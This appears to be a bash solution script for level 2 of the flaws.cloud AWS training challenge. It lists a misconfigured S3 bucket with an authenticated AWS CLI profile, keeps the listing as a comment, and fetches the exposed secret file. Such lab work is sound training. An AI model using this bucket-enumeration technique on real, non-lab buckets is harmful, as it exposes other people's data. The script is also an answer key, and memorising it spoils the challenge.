#!/bin/bash
# http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
curl http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

aws s3 --profile default ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
:'2017-02-27 02:02:15      80751 everyone.png
2017-03-03 03:47:17       1433 hint1.html
2017-02-27 02:04:39       1035 hint2.html
2017-02-27 02:02:14       2786 index.html
2017-02-27 02:02:14         26 robots.txt
2017-02-27 02:02:15       1051 secret-e4443fc.html'

curl http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html